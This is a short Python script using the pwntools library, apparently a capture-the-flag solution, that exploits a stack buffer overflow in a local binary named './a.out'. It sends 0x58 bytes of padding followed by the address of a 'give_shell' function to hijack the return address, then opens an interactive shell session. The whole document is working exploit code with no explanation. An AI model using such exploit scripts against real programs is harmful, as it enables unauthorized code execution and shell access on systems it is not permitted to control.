#!/usr/bin/env python
from pwn import *

e = ELF("./a.out").symbols
p = process("./a.out")
give_shell = e["give_shell"]

print(hex(give_shell))
p.sendline("A" * (0x50+ 8) + p64(give_shell))
p.interactive()
